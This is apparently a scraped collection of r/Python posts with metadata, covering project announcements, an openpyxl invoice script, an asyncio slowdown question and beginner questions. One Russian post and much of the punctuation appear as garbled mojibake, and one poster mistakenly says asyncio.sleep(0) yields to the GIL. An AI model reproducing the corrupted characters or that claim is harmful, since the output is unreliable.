Lemonade runs LLMs on PCs by loading them into a server process with an inference engine. Then, users can:

* Load up the web ui to get a GUI for chatting with the LLM and managing models.
* Connect to other applications over the OpenAI API (chat, coding assistants, document/RAG search, etc.).
* Try out optimized backends, such as ROCm 7 betas for Radeon GPUs or OnnxRuntime-GenAI for Ryzen AI NPUs.

**Target Audience**

* Users who want a dead-simple way to get started with LLMs. Especially if their PC has hardware like Ryzen AI NPU or a Radeon GPU that benefit from specialized optimization.
* Developers who are building cross-platform LLM apps and don't want to worry about the details of setting up or optimizing LLMs for a wide range of PC hardware.

**Comparison**

Lemonade is designed with the following 3 ideas in mind, which I think are essential for local LLMs. Each of the major alternatives has an inherent blocker that prevents them from doing at least 1 of these:

1. Strictly open source.
2. Auto-optimizes for any PC, including off-the-shelf llama.cpp, our own custom llama.cpp recipes (e.g., TheRock), or integrating non-llama.cpp engines (e.g., OnnxRuntime).
3. Dead simple to use and build on with GUIs available for all features.

Also, it's the only local LLM server (AFAIK) written in Python! I wrote about the choice to use Python at length [here](https://www.amd.com/en/developer/resources/technical-articles/2025/rethinking-local-ai-lemonade-servers-python-advantage.html).

GitHub: [https://github.com/lemonade-sdk/lemonade](https://github.com/lemonade-sdk/lemonade)"
1n00eqa,Learning bots with python,Ok_Presentation9879,5,8,2025-08-25 19:39:49,https://www.reddit.com/r/Python/comments/1n00eqa/learning_bots_with_python/,"Hi everyone I wanted to come on and ask if anyone has good resources for learning to make python bots (chatbots, discord bots). For some context I have a good grasp on the language and am looking to further my skills by learning to make bots but don't know where to start. Any suggestions are greatly appreciated! "
1n001ny,take an existing excel invoice template and makes a .py easily modifies it with simple inputs,DerrickBagels,0,3,2025-08-25 19:25:50,https://www.reddit.com/r/Python/comments/1n001ny/take_an_existing_excel_invoice_template_and_makes/,"asks for an excel template once and stores config (invoice cells, work/expense ranges, customer cells)

* maintains a customer list and lets you choose/use last/new
* fills multiple work items and expenses
* auto increments invoice number and sets invoice date
* outputs a new excel with date in filename

you can run this as a standalone `.py`:

    import json
    import os
    from datetime import datetime
    from openpyxl import load_workbook
    
    # for pdf export on windows
    try:
        import win32com.client
        WIN32_AVAILABLE = True
    except ImportError:
        WIN32_AVAILABLE = False
        print(""win32com not found, PDF export will be skipped"")
    
    CONFIG_FILE = ""invoice_config.json""
    CUSTOMERS_FILE = ""customers.json""
    
    def setup_config():
        config = {}
        config['template'] = input(""Path to invoice template Excel: "")
    
        config['invoice_date'] = input(""Cell for invoice date (e.g. B2): "")
        config['invoice_number'] = input(""Cell for invoice number (e.g. B3): "")
    
        print(""Customer fields in template"")
        config['customer_cells'] = {
            'name': input(""Cell for customer name: ""),
            'phone': input(""Cell for customer phone: ""),
            'email': input(""Cell for customer email: ""),
            'address': input(""Cell for customer address: ""),
            'postal': input(""Cell for customer postal code: "")
        }
    
        print(""Enter ranges for work items (rows only)"")
        config['work_rows'] = input(""Rows for work items (comma-separated, e.g. 5,6,7): "").split(',')
        config['work_cols'] = {
            'date': input(""Column for work date (e.g. B): ""),
            'desc': input(""Column for work description (e.g. C): ""),
            'hours': input(""Column for work hours (e.g. D): "")
        }
    
        print(""Enter ranges for expenses (rows only)"")
        config['expense_rows'] = input(""Rows for expenses (comma-separated, e.g. 10,11,12): "").split(',')
        config['expense_cols'] = {
            'date': input(""Column for expense date (e.g. B): ""),
            'desc': input(""Column for expense description (e.g. C): ""),
            'value': input(""Column for expense value (e.g. D): ""),
            'link': input(""Column for expense link (e.g. E): "")
        }
    
        with open(CONFIG_FILE, ""w"") as f:
            json.dump(config, f, indent=2)
        print(""Config saved as invoice_config.json"")
    
    def load_customers():
        if os.path.exists(CUSTOMERS_FILE):
            return json.load(open(CUSTOMERS_FILE))
        return []
    
    def save_customers(customers):
        with open(CUSTOMERS_FILE, ""w"") as f:
            json.dump(customers, f, indent=2)
    
    def select_customer(customers):
        if customers:
            choice = input(""Customer option (last/select/new): "").strip().lower()
        else:
            choice = ""new""
    
        if choice == ""last"":
            return customers[-1], customers
        elif choice == ""select"":
            for i, c in enumerate(customers):
                print(f""{i}: {c['name']}"")
            idx = int(input(""Select customer index: ""))
            return customers[idx], customers
        else:  # new
            customer = {
                ""name"": input(""Customer name: ""),
                ""phone"": input(""Phone: ""),
                ""email"": input(""Email: ""),
                ""address"": input(""Address: ""),
                ""postal"": input(""Postal code: "")
            }
            customers.append(customer)
            save_customers(customers)
            return customer, customers
    
    def export_pdf(excel_path, pdf_path):
        if not WIN32_AVAILABLE:
            print(""PDF export skipped, win32com not installed"")
            return
        excel = win32com.client.Dispatch(""Excel.Application"")
        excel.Visible = False
        wb = excel.Workbooks.Open(os.path.abspath(excel_path))
        ws = wb.Worksheets[1]
        ws.ExportAsFixedFormat(0, os.path.abspath(pdf_path))
        wb.Close(False)
        excel.Quit()
        print(f""PDF saved as {pdf_path}"")
    
    def fill_invoice():
        config = json.load(open(CONFIG_FILE))
        wb = load_workbook(config['template'])
        ws = wb.active
    
        customers = load_customers()
        customer, _ = select_customer(customers)
    
        # fill customer fields
        ws[config['customer_cells']['name']] = customer['name']
        ws[config['customer_cells']['phone']] = customer['phone']
        ws[config['customer_cells']['email']] = customer['email']
        ws[config['customer_cells']['address']] = customer['address']
        ws[config['customer_cells']['postal']] = customer['postal']
    
        # invoice date and number
        today = datetime.today().strftime(""%Y-%m-%d"")
        ws[config['invoice_date']] = today
        current_invoice = int(ws[config['invoice_number']].value)
        ws[config['invoice_number']] = current_invoice + 1
    
        # fill work items
        for row in config['work_rows']:
            row = row.strip()
            ws[f""{config['work_cols']['date']}{row}""] = input(f""Work date for row {row}: "")
            ws[f""{config['work_cols']['desc']}{row}""] = input(f""Work description for row {row}: "")
            ws[f""{config['work_cols']['hours']}{row}""] = input(f""Work hours for row {row}: "")
    
        # fill expenses
        for row in config['expense_rows']:
            row = row.strip()
            ws[f""{config['expense_cols']['date']}{row}""] = input(f""Expense date for row {row}: "")
            ws[f""{config['expense_cols']['desc']}{row}""] = input(f""Expense description for row {row}: "")
            ws[f""{config['expense_cols']['value']}{row}""] = input(f""Expense value for row {row}: "")
            ws[f""{config['expense_cols']['link']}{row}""] = input(f""Expense link for row {row}: "")
    
        excel_filename = f""invoice_{today}.xlsx""
        wb.save(excel_filename)
        print(f""Invoice saved as {excel_filename}"")
    
        pdf_filename = f""invoice_{today}.pdf""
        export_pdf(excel_filename, pdf_filename)
    
    def main():
        if not os.path.exists(CONFIG_FILE):
            print(""No config found. Running setup..."")
            setup_config()
        fill_invoice()
    
    if __name__ == ""__main__"":
        main()
    

**notes:**

* pdf export works on **Windows with Excel installed**
* outputs both `invoice_YYYY-MM-DD.xlsx` and `.pdf`
* keeps customer list in `customers.json`
* handles multiple work and expense rows

* dynamic customer selection / storage
* multiple work and expense rows
* invoice date auto-update
* invoice number auto-increment
* outputs new excel file named by date

"
1mzxbia,"I created this polygon screenshot tool for myself, I must say it may be useful to others!",sultanaiyan1098,191,17,2025-08-25 17:44:18,https://www.reddit.com/r/Python/comments/1mzxbia/i_created_this_polygon_screenshot_tool_for_myself/,"* **What My Project Does -** Take a screenshot by drawing a precise polygon rather than being limited to a rectangular or manual free-form shape
* **Target Audience -** Meant for *production (For me, my professor just give notes pdf with everything jumbled together so I wanted to keep them organized, obviously on my note by taking screenshots of them)*
* **Comparison -** I am a windows user, neither does windows provide default polygon screenshot tool nor are they available on anywhere else on internet
* You can check it out on github: [https://github.com/sultanate-sultan/polygon-screenshot-tool](https://github.com/sultanate-sultan/polygon-screenshot-tool)
* You can find the demo video on my github repo page"
1mzv2v2,16 –ª–µ—Ç —É—á—É—Å—å —Å–∞–º–æ—É—á–∫–∞,notProper-Drama71,0,11,2025-08-25 16:22:25,https://www.reddit.com/r/Python/comments/1mzv2v2/16_–ª–µ—Ç_—É—á—É—Å—å_—Å–∞–º–æ—É—á–∫–∞/,"–∑–¥—Ä–∞—Å—å—Ç–µ —è –±—É–¥—É—â–∏–π –ø—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç. –í—ã–±—Ä–∞–ª —è–∑—ã–∫ –ø–∏—Ç–æ–Ω, —á—Ç–æ –ø–æ—Å–æ–≤–µ—Ç—É–µ—Ç–µ –≥–¥–µ –±—Ä–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é?
–±–µ—Ä—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –±–ª–æ–≥–µ—Ä—ã 15 —á–∞—Å–æ–≤—ã–µ 5 —á–∞—Å–æ–≤—ã–µ –≤–∏–¥–µ–æ —Å–º–æ—Ç—Ä—é. –∏ –µ—â–µ –∫–∞–∫ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø—Ä–∞–∫—Ç–∏–∫–æ–≤–∞—Ç—Å—è? –≤—Å–µ –≥–æ–≤–æ—Ä—è—Ç —á—Ç–æ –Ω–∞–¥–æ –ø—Ä–∞–∫—Ç–∏–∫–∏ –º–Ω–æ–≥–æ –∞ –∫–∞–∫ –ø—Ä–∞–≤–∏–ª—å–Ω–æ —ç—Ç–æ –¥–µ–ª–∞—Ç—å?"
1mzmaj1,[R] Advanced Conformal Prediction ‚Äì A Complete Resource from First Principles to Real-World,predict_addict,17,13,2025-08-25 09:58:28,https://www.reddit.com/r/Python/comments/1mzmaj1/r_advanced_conformal_prediction_a_complete/,"Hi everyone,

I‚Äôm excited to share that my new book,¬†***Advanced Conformal Prediction: Reliable Uncertainty Quantification for Real-World Machine Learning***, is now available in early access.

Conformal Prediction (CP) is one of the most powerful yet underused tools in machine learning: it provides¬†**rigorous, model-agnostic uncertainty quantification with finite-sample guarantees**. I‚Äôve spent the last few years researching and applying CP, and this book is my attempt to create a¬†**comprehensive, practical, and accessible guide**‚Äîfrom the fundamentals all the way to advanced methods and deployment.

# What the book covers

* **Foundations**¬†‚Äì intuitive introduction to CP, calibration, and statistical guarantees.
* **Core methods**¬†‚Äì split/inductive CP for regression and classification, conformalized quantile regression (CQR).
* **Advanced methods**¬†‚Äì weighted CP for covariate shift, EnbPI, blockwise CP for time series, conformal prediction with deep learning (including transformers).
* **Practical deployment**¬†‚Äì benchmarking, scaling CP to large datasets, industry use cases in finance, healthcare, and more.
* **Code & case studies**¬†‚Äì hands-on Jupyter notebooks to bridge theory and application.

# Why I wrote it

When I first started working with CP, I noticed there wasn‚Äôt a single resource that takes you¬†**from zero knowledge to advanced practice**. Papers were often too technical, and tutorials too narrow. My goal was to put everything in one place: the theory, the intuition, and the engineering challenges of using CP in production.

If you‚Äôre curious about uncertainty quantification, or want to learn how to make your models not just accurate but also¬†**trustworthy and reliable**, I hope you‚Äôll find this book useful.

Happy to answer questions here, and would love to hear if you‚Äôve already tried conformal methods in your work!"
1mzcxyc,Adding asyncio.sleep(0) made my data pipeline (150 ms) not spike to (5500 ms),Chuyito,171,39,2025-08-25 01:00:45,https://www.reddit.com/r/Python/comments/1mzcxyc/adding_asynciosleep0_made_my_data_pipeline_150_ms/,"I've been rolling out the oddest fix across my async code today, and its one of those that feels dirty to say the least.

Data pipeline has 2 long running asyncio.gather() tasks:

* 1 reads 6k rows over websocket every 100ms and stores them to a global dict of dicts
* 2 ETLs a deepcopy of the dicts and dumps it to a DB.

After \~30sec of running, this job gets insanely slow.

    04:42:01 PM Processed 6745 async_run_batch_insert in 159.8427 ms
    04:42:02 PM Processed 6711 async_run_batch_insert in 162.3137 ms
    ...
    04:42:09 PM Processed 6712 async_run_batch_insert in 5489.2745 ms

Up to 5k rows, this job was happily running for months. Once I scaled it up beyond 5k rows, it hit this random slowdown.

Adding an \`asyncio.sleep(0)\` at the end of my function completely got rid of the ""slow"" runs and its consistently 150-160ms for days with the full 6700 rows. Pseudocode:

    async def etl_to_db():
      # grab a deepcopy of the global msg cache
      # etl it
      # await dump_to_db(etl_msg)
      await asyncio.sleep(0)  # <-- This ""fixed it""
    
    
    async def dump_books_to_db():
      while True:
        # Logic to check the ws is connected
        await etl_to_db()
        await asyncio.sleep(0.1)
    
    await asyncio.gather(
      dump_books_to_db(),
      sub_websocket()
     )

I believe the sleep yields control back to the GIL? Both gpt and grok were a bit useless in debugging this, and kept trying to approach it from the database schema being the reason for the slowdown.

Given we're in 2025 and python 3.11, this feels insanely hacky... but it works. am I missing something"
1mzbnhm,Monday Daily Thread: Project ideas!,AutoModerator,2,2,2025-08-25 00:00:30,https://www.reddit.com/r/Python/comments/1mzbnhm/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1mzbj8n,I built a Python Prisoner's Dilemma Simulator,jaaberg1981,20,8,2025-08-24 23:55:07,https://www.reddit.com/r/Python/comments/1mzbj8n/i_built_a_python_prisoners_dilemma_simulator/,"https://github.com/jasonaaberg/Prisoners-Dilemma

What My Project Does: It is a Python Based Prisoner's Dilemma simulator. 

Target Audience: This is meant for anyone who has interests in Game Theory and learning about how to collect data and compare outcomes.

Comparison: I am unaware of any other Python based Prisoner's Dilemma simulators but I am sure they exist. 

There's a CLI and GUI version in this repo. It can be played as Human vs. Computer or Computer vs. Computer. There are 3 built in computer strategies to choose from and you can define how many rounds it will play. When you run the auto play all option it will take a little while as it runs all of the rounds in the background and then shows the output.

If you get a chance I would love some feedback. I wrote a lot of the code myself and also use Claude to help out with a lot of the stuff that I couldn't figure out how to make it work.

If anyone does look at it thank you in advance!!!!!"
1mz83yx,"Clipipe ‚Äì Pipe command output between machines, even behind NAT",Interesting_Flower93,3,6,2025-08-24 21:30:23,https://www.reddit.com/r/Python/comments/1mz83yx/clipipe_pipe_command_output_between_machines_even/,"Hi everyone üëã

I built [**Clipipe**](https://clipipe.io/), a small open-source tool written in Python that lets you **pipe command output from one machine to another**, even if they‚Äôre behind NAT or firewalls.

# üîπ What My Project Does

Clipipe makes it easy to send and receive data between machines using simple, human-readable codes. You can use it in shell pipelines, so anything you‚Äôd normally pipe (`stdout` ‚Üí `stdin`) can now cross machines.

**Example:**

    # Send data
    echo ""Hello World"" | clipipe send
    # -> returns a short code, e.g. bafilo42
    
    # Retrieve it elsewhere
    clipipe receive bafilo42

It works just as well for files and archives:

    tar cz project/ | clipipe send
    clipipe receive <code> | tar xz

# üîπ Target Audience

* Developers who want a quick, frictionless way to move data between machines (work ‚Üî home, dev ‚Üî server, VM ‚Üî host).
* People working behind strict NAT/firewalls where `scp`, `ssh`, or direct networking isn‚Äôt possible.
* Anyone who likes CLI-first tools that integrate naturally into existing Unix pipelines.

This is a **production-ready tool** (available on PyPI, installable via `pipx` or `uv`), but also a small project that‚Äôs fun to self-host and extend.

# üîπ Comparison

* Unlike `scp`/`rsync`, you don‚Äôt need SSH access or firewall configuration ‚Äî just a short code.
* Unlike `netcat` or `socat`, it works even when both peers are behind NAT.
* Unlike pastebin-style tools, it‚Äôs designed for binary-safe data and direct use in pipelines (`stdin`/`stdout`).

# Install

    pipx install clipipe

(or `uvx install clipipe` if you prefer `uv`)

Repo: [github.com/amirkarimi/clipipe](https://github.com/amirkarimi/clipipe)  
Docs + server: [clipipe.io](https://clipipe.io/)"
1mz2o6w,Secure P2P Messenger.,bangadov,0,5,2025-08-24 18:01:34,https://www.reddit.com/r/Python/comments/1mz2o6w/secure_p2p_messenger/,"Hey I'm working on a project for secure messages without leaving any trace, and welcome any contribution from the senior ones since I'm very new to this. Please suggest or review the code.

https://github.com/Anujjake/Secure-P2P"
1myz5ir,I hate that my university's computer science INTRO classes use C++ instead of Python. Why use C++?,Daniel_Meldrum,0,36,2025-08-24 15:50:19,https://www.reddit.com/r/Python/comments/1myz5ir/i_hate_that_my_universitys_computer_science_intro/,"Python is way easier than C++. I know from experience. Other colleges use Python in their intro classes, which is way more understandable and a way better way to learn programming. For some reason, my university just has to use one of the hardest programming languages just to torture us."
1myytuq,What's the worst Python feature you've ever encountered in programs?,ConstantSpirited2039,18,178,2025-08-24 15:37:50,https://www.reddit.com/r/Python/comments/1myytuq/whats_the_worst_python_feature_youve_ever/,"It's no doubt that Python is a beautifully structured language with readability qnd prototyping as its first priorities, but it too has its own downsides. It is much slower as compared to other languages, but its acceptable since it's an interpreted language and massive community support.

But that's not the main point of this post.

There are some features in Python which I find absolutely terrible, and pretty much meaningless, though it might not be the case for others.

One of them is ""from <module> import *"". Like, ""Why?""
It's one of the most terrible features to me. It pollutes the namespace, doesn't work properly when the program has the same function/variable names, and sometimes even overrides the custom functions if not monitored properly. Yes, I get that it means that you have to type lesser characters, but there are other ways to do so. That's why I use ""import <module> as <mod>"" and ""from <module> import <function>"" according to my convenience, because it patches those problems aforementioned.

What features do you people find useless though?"
1myuda8,AsyncFlow: Open-source simulator for async backends (built on SimPy),Straight_Remove8731,21,9,2025-08-24 12:32:49,https://www.reddit.com/r/Python/comments/1myuda8/asyncflow_opensource_simulator_for_async_backends/,"Hey¬†[r/Python](/r/Python/)¬†üëã

I‚Äôd like to share¬†**AsyncFlow**, an open-source simulator I‚Äôm building to model asynchronous, distributed backends in Python.

# üîπ What My Project Does

AsyncFlow lets you describe a system topology (client ‚Üí load balancer ‚Üí servers ‚Üí edges) and run¬†**discrete-event simulations**with¬†**event-loop semantics**:

* Servers emulate FastAPI+Uvicorn behavior (CPU-bound = blocking, I/O = yields).
* Edges simulate network latency, drops, and even chaos events like spikes or outages.
* Out-of-the-box metrics: latency distributions (p95/p99), throughput, queues, RAM, concurrent connections.
* Input is YAML (validated by Pydantic) or Python objects.

Think of it as a¬†**digital twin**¬†of a service: you can run ‚Äúwhat-if‚Äù scenarios in seconds before touching real infra.

# üîπ Target Audience

* **Learners**: people who want to¬†*see*¬†what happens in async systems (event loop, blocking vs async tasks, effects of failures).
* **Educators**: use it in teaching distributed systems or Python async programming.
* **Planners**: devs who want a quick, pre-deployment view of capacity, latency, or resilience trade-offs.

Repo: üëâ¬†[https://github.com/AsyncFlow-Sim/AsyncFlow](https://github.com/AsyncFlow-Sim/AsyncFlow)

I‚Äôd love feedback on:

* Whether the abstractions (actors, edges, events) feel useful.
* Which features/metrics would matter most to you.
* Any OSS tips on docs and examples.

Thanks, happy to answer questions! üöÄ"
1myslq3,Kryypto: a fully keyboard supported python text editor.,SxxVe,18,20,2025-08-24 10:58:43,https://www.reddit.com/r/Python/comments/1myslq3/kryypto_a_fully_keyboard_supported_python_text/,"Kryypto is a Python-based text editor designed to be lightweight and fully operable via the keyboard. It allows deep customization with CSS and a configuration file, includes built-in Git/GitHub integration, and supports syntax highlighting for multiple formats.

# Features:

* Lightweight ‚Äì minimal overhead
* Full Keyboard Support ‚Äì no need for the mouse, every feature is accessible via hotkeys
* Custom Styling
   * `config\configuration.cfg` for editor settings
   * CSS for theme and style customization
* Editing Tools
   * Find text in file
   * Jump to line
   * Adjustable cursor (color & width)
   * Configurable animations (types & duration)
* Git & GitHub Integration
   * View total commits
   * See last commit message & date
   * Track file changes directly inside the editor
* Productivity Features
   * Autocompleter
   * Builtin Terminal
   * Docstring panel (hover to see function/class docstring)
   * Tab-based file switching
   * Custom title bar
* Syntax Highlighting for
   * Python
   * CSS
   * JSON
   * Config files
   * Markdown

# Target Audience

* Developers who prefer keyboard-driven workflows (no mouse required)
* Users looking for a lightweight alternative to heavier IDEs
* People who want to customize their editor with CSS and configuration settings
* Anyone experimenting with Python-based editors or open-source text editing tools

# Comparison:

* Lightweight ‚Äì minimal overhead, focused on speed
* Highly customizable ‚Äì styling via CSS and config files
* Keyboard-centric ‚Äì designed to be fully usable without a mouse

[Kryypto](https://github.com/NaturalCapsule/Kryypto)

  
It‚Äôs not meant to replace full IDEs, but aims to be a **fast, customizable, Python-powered text editor**."
1myrhdt,Netbook - a jupyter client for the terminal,lyovushka,7,3,2025-08-24 09:51:37,https://www.reddit.com/r/Python/comments/1myrhdt/netbook_a_jupyter_client_for_the_terminal/,"Hey folks!

I‚Äôm excited to share a project I‚Äôve been hacking on: [netbook](https://github.com/lyovushka/netbook), a Jupyter notebook client that works directly in your terminal (yet another one).

**What My Project Does**

netbook brings the classic Jupyter notebook experience right to your terminal, built using the [textual](https://textual.textualize.io/) framework. It doesn't aim to be an IDE, so there are is no file browser nor any menus. Rather it aims to provide a smooth and familiar experience for jupyter notebook users. Check out the demo on the [github](https://github.com/lyovushka/netbook)

**Highlights**

* Emulates Jupyter with cell execution and outputs directly in the terminal
* Image outputs in most major terminals (Kitty, Wezterm, iTerm2, etc.)
* Pretty printing pandas dataframes
* Kernel selector for working with different languages
* Great for server environments or coding without a browser

**Target Audience**

The intersection of people who prefer working in terminals and people who use jupyter notebooks.

**Comparison**

The key difference with related projects is that netbook doesn't aim to be an IDE. It aims to provide a smooth experience in the limited scope as a notebook environment. Some related projects.

* [euporie](https://euporie.readthedocs.io/en/latest/) is the undisputed king of terminal jupyter clients. One key difference is that euporie predates textual and is built on prompt-toolkit instead.
* [jpterm](https://github.com/davidbrochart/jpterm) is built on textual and has been in development for a while. It aims to be an IDE and is still work in progress.
* [erys](https://github.com/natibek/erys) is also built on Textual. It aims to be an IDE. It also doesn't support yet features like plotting in terminal and pretty printing dataframes."
1myr7yk,"Claude Code Mate (CCM): A companion tool for Claude Code, enabling flexible LLM integration.",RussellLuo,0,2,2025-08-24 09:35:23,https://www.reddit.com/r/Python/comments/1myr7yk/claude_code_mate_ccm_a_companion_tool_for_claude/,"# What My Project Does

[Claude Code Mate](https://github.com/RussellLuo/claude-code-mate) is a companion tool for Claude Code, enabling flexible LLM integration through LiteLLM proxy.

(The code of Claude Code Mate is mainly vibe coded by Claude Code, with some adjustments and enhancements made by the author. ü§ñ‚ú®)

# Target Audience

Anyone who wants to use Claude Code with different LLM models (or providers).

# Installation

    # Install with uv
    uv pip install claude-code-mate
    
    # Or with pip
    pip install claude-code-mate

# Quick Start

Start the LiteLLM proxy:

    ccm start

Set up the environment variables according to the given instructions of `ccm start`:

    export ANTHROPIC_BASE_URL=http://0.0.0.0:4000
    export ANTHROPIC_AUTH_TOKEN=sk-1234567890

Then run Claude Code with your desired model:

    claude --model claude-3.5-haiku

Free free to check it out or install it [here](https://github.com/RussellLuo/claude-code-mate)."
1myh5s2,Pylance couldn't create connection to server my Intellicode stopped working,wankyBrittana,0,2,2025-08-24 00:04:21,https://www.reddit.com/r/Python/comments/1myh5s2/pylance_couldnt_create_connection_to_server_my/,"I have this error here: 

**Pylance client: couldn't create connection to server. Launching server using command C:\\Users\\z0234411\\Downloads\\apache-maven-3.9.11-bin\\apache-maven-3.9.11\\bin failed. Error: spawn C:\\Users\\z0234411\\Downloads\\apache-maven-3.9.11-bin\\apache-maven-3.9.11\\bin ENOENT**

And the output is:

    2025-08-23 20:59:27.776 [info] (Client) Running with node: C:\Users\z0234411\Downloads\apache-maven-3.9.11-bin\apache-maven-3.9.11\bin
    2025-08-23 20:59:27.777 [error] Pylance client: couldn't create connection to server.
    Launching server using command C:\Users\z0234411\Downloads\apache-maven-3.9.11-bin\apache-maven-3.9.11\bin failed. Error: spawn C:\Users\z0234411\Downloads\apache-maven-3.9.11-bin\apache-maven-3.9.11\bin ENOENT
    2025-08-23 20:59:28.278 [info] (Client) Pylance client (2025.7.1) started with python extension (2025.13.2025082101)

But the folder \\bin exists and I seached for it. I am new to python, am I not aware of something that could be helpul?"
1myh2vu,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,1,6,2025-08-24 00:00:32,https://www.reddit.com/r/Python/comments/1myh2vu/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1myfkuw,I made a MkDocs plugin to embed interactive jupyter notebooks in your docs via jupyterlite.,Nick-Crews,41,5,2025-08-23 22:52:35,https://www.reddit.com/r/Python/comments/1myfkuw/i_made_a_mkdocs_plugin_to_embed_interactive/,"I made [https://github.com/NickCrews/mkdocs-jupyterlite](https://github.com/NickCrews/mkdocs-jupyterlite) after being disappointed with the existing options for sharing notebooks on my doc site:  
  
\- [Binder](https://mybinder.org/): sharable, interactive environments. Requires a full docker environment and a remote server. Hosted separately from your docs, so a user has to click away. Takes 30-60 seconds to boot up. Similar to this would be a link to a google colab notebook.  
  
\- [mkdocs-jupyter](https://github.com/danielfrg/mkdocs-jupyter): A MkDocs plugin that embeds¬†*static*¬†Jupyter notebooks into your MkDocs site. Easy to use, but with the main downside that all the content is static. Users can't play around with the notebook.

\- [jupyterlite-sphinx](https://github.com/jupyterlite/jupyterlite-sphinx): A Sphinx extension that integrates JupyterLite within your Sphinx docs site. Nearly exactly what I wanted, but I use MkDocs, not sphinx.

I just wanted to share this project here as an FYI. I would love to see people file issues and PRs to make this useful to a larger community!"
1my65vc,"I‚Äôm starting a series on Python performance optimizations, Looking for real-world use cases!",BillThePonyWasTaken,71,60,2025-08-23 16:36:36,https://www.reddit.com/r/Python/comments/1my65vc/im_starting_a_series_on_python_performance/,"Hey everyone,

I‚Äôm planning to start a series (not sure yet if it‚Äôll be a blog, video, podcast, or something else) focused on **Python performance**. The idea is to explore concrete ways to:

* Make Python code run faster
* Optimize memory usage
* Reduce infrastructure costs (e.g., cloud bills)

I‚Äôd love to base this on **real-world use cases** instead of just micro-benchmarks or contrived examples.

 If you‚Äôve ever run into performance issues in Python  whether it‚Äôs slow scripts, web backends costing too much to run, or anything else I‚Äôd really appreciate if you could share your story.

These will serve as case studies for me to propose optimizations, compare approaches, and hopefully make the series valuable for the community.

Thanks in advance for any examples you can provide!"
1my5d0x,Agex: An agent framework that integrates with libraries (tools optional),Impressive-Glass-523,0,0,2025-08-23 16:05:16,https://www.reddit.com/r/Python/comments/1my5d0x/agex_an_agent_framework_that_integrates_with/,"# What My Project Does

Most agentic frameworks require you to wrap your code in tool abstractions and deal with JSON serialization. To avoid that I built `agex`‚Äîa Python-native agentic framework where agents work directly with your existing libraries. It makes for low-friction handoff of objects to/from agents.

For example:

```python
import math
from typing import Callable
from agex import Agent

agent = Agent(primer=""You are an expert at writing small, useful functions."")

# Equip the agent with the math module
agent.module(math)

# The fn sig is the contract; the agent provides the implementation at runtime
@agent.task
def build_function(prompt: str) -> Callable:
    """"""Build a callable function from a text prompt.""""""
    pass

# The agent returns a real, callable Python function, not a JSON blob
is_prime = build_function(""a function that checks if a number is prime"")

# You can use it immediately
print(f""Is 13 prime? {is_prime(13)}"")
# > Is 13 prime? True
```

It works by parsing agent-generated code into an AST and running it in a sandbox allowing only whitelisted operations. Since the sandbox is in your runtime, it eases the flow of complex objects between your code and the agent.

From the agent's point-of-view, it lives in a Python REPL. It has its own stdout with which to inspect data and see errors in order to self-correct when completing tasks. An agent's REPL is persisted across tasks, so agents can build their own helpers and improve over time.

A gentle introductory notebook: [Agex 101](https://ashenfad.github.io/agex/examples/agex101/)

A fancier notebook using `OSMnx` & `Folio` for routing: [Routing](https://ashenfad.github.io/agex/examples/routing/)

# Comparison

Its closest relative is Hugging Face's excellent `smol-agents`. While both ""think-in-code"", `agex` focuses on interoperability, allowing agents to receive and return complex Python objects like DataFrames, Plotly figures, or even callables.

# Target Audience

The project is oriented toward Python devs building agent systems on pre-existing systems. Agex is early-stage but the core concepts are stabilizing. I'm hoping to find a few brave souls to kick the tires. Thanks!

- **GitHub:** [https://github.com/ashenfad/agex](https://github.com/ashenfad/agex)
- **Docs & Examples:** [https://ashenfad.github.io/agex/](https://ashenfad.github.io/agex/)
"
1my1qcf,SmartRun: A Python runner that auto-installs imports (even with mismatched names) üöÄ,No-Consequence-3216,0,8,2025-08-23 13:39:36,https://www.reddit.com/r/Python/comments/1my1qcf/smartrun_a_python_runner_that_autoinstalls/,"Have you ever tried to run a Python file or notebook and got stuck because:  
- You didn‚Äôt have all the required packages installed, or  
